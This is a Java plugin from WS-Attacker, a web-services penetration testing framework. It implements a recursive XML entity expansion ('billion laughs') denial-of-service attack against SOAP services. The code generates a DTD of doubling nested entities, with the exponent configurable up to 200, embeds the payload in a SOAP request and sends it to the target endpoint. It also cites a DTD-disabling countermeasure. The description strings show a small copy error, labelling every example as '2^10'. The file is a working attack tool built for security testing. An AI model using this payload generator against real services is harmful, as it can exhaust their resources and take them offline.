/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos;

import java.util.HashMap;
import java.util.Map;
import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.plugin.option.OptionLimitedInteger;
import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;
import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;

public class XmlEntityExpansion
    extends AbstractDosPlugin
{

    private static final long serialVersionUID = 1L;

    // Custom Attributes
    private AbstractOptionInteger optionExponent;

    @Override
    public void initializeDosPlugin()
    {
        initData();
        // Custom Initilisation
        optionExponent =
            new OptionLimitedInteger( "Number of entities (power of 2)", 20,
                                      "Exponent for calculating the number of entities (total entities = 2^Param8)", 1,
                                      200 );
        getPluginOptions().add( optionExponent );
    }

    public AbstractOptionInteger getOptionNumberOfEntities()
    {
        return optionExponent;
    }

    @Override
    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition()
    {
        return OptionTextAreaSoapMessage.PayloadPosition.BODYLASTCHILDELEMENT;
    }

    public void initData()
    {
        setName( "XML Entity Expansion (recursive)" );
        setDescription( "<html><p>This attack checks whether or not a Web service is vulnerable to the \"XML Entity Expansion\" attack.</p>"
            + "<p>A vulnerable Web service runs out of resources when trying to resolve a large amount of recursively defined entities."
            + "The entities are defined in the Document Type Definition (DTD). "
            + "A detailed description of the attack can be found on <a href=\"http://clawslab.nds.rub.de/wiki/index.php/XML_Remote_Entity_Expansion\">http://clawslab.nds.rub.de/wiki/index.php/XML_Remote_Entity_Expansion</a></p>"
            + "<p>The attack algorithm replaces the string $$PAYLOADATTR$$ in the SOAP message below "
            + "with an attribute that uses an entity that will start the recursive process. "
            + "The placeholder $$PAYLOADATTR$$ can be set to any other position in the SOAP message.</p>"
            + "<p>The number of entitites defines the exponent that is used for calculating the number of resulting XML entities. "
            + "The base is 2.<ul>"
            + "<li>Input 10 will result in  2^10 = 1024 entities.</li>"
            + "<li>Input 15 will result in  2^10 = 32768 entities.</li>"
            + "<li>Input 20 will result in  2^10 = 1048576 entities.</li>"
            + "<li>Input 25 will result in  2^10 = 33554432 entities</li></ul></p></html>" );
        setCountermeasures( "In order to counter the attack, the DTD-processing (Document Type Definitions) feature has to be disabled completly.\n"
            + "Apache Axis2 1.5.2 is known to be vulnerable to this attack. Current versions of Apache Axis2 are not vulnerable anymore" );
    }

    @Override
    public void createTamperedRequest()
    {

        // get Message
        String soapMessageFinal;
        String soapMessage = this.getOptionTextAreaSoapMessage().getValue();

        // inset payload entity in envelope
        // String attribute = "entityAttack=\"&x1;\"";
        // soapMessage =
        // this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage,
        // attribute);

        // prepend DTD to message
        StringBuilder sb = new StringBuilder();
        sb.append( "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" );
        sb.append( "<!DOCTYPE " );
        sb.append( "Envelope [" );
        sb.append( "<!ENTITY x0 \"Fo\">" );
        int value = optionExponent.getValue();
        for ( int element = 1; element < value; element++ )
        {
            sb.append( "<!ENTITY x" + element + " \"&x" + ( element - 1 ) + ";&x" + ( element - 1 ) + ";\">" );
        }
        sb.append( "]" );
        sb.append( ">" );
        sb.append( this.getOptionTextAreaSoapMessage().getValue() );
        // sb.append("\r\n\r\n");
        soapMessage = sb.toString();
        soapMessageFinal =
            this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload( soapMessage,
                                                                               "<s>&x" + ( value - 1 ) + ";</s>" );

        // sb = new StringBuilder();
        // sb.append("<!DOCTYPE root [");
        // sb.append("<!ENTITY x32 \"foobar\">");
        // for (int i = 32; i > 0; i--) {
        // sb.append("<!ENTITY x" + (i - 1) + " \"&x" + i + ";&x" + i + ";\">");
        // }
        // sb.append("]>");
        // sb.append("root attr=\"&x1;\"/>"); // \r\n\r\n
        // soapMessageFinal = sb.toString();

        // get HeaderFields from original request, if required add custom
        // headers - make sure to clone!
        Map<String, String> httpHeaderMap = new HashMap<String, String>();
        for ( Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet() )
        {
            httpHeaderMap.put( entry.getKey(), entry.getValue() );
        }
        httpHeaderMap.put( "Content-Type", "application/xml; charset=UTF-8" ); // ;
                                                                               // charset=UTF-8"

        // write payload and header to TamperedRequestObject
        this.setTamperedRequestObject( httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal );

    }
    // ----------------------------------------------------------
    // All custom DOS-Attack specific Methods below!
    // ----------------------------------------------------------
}
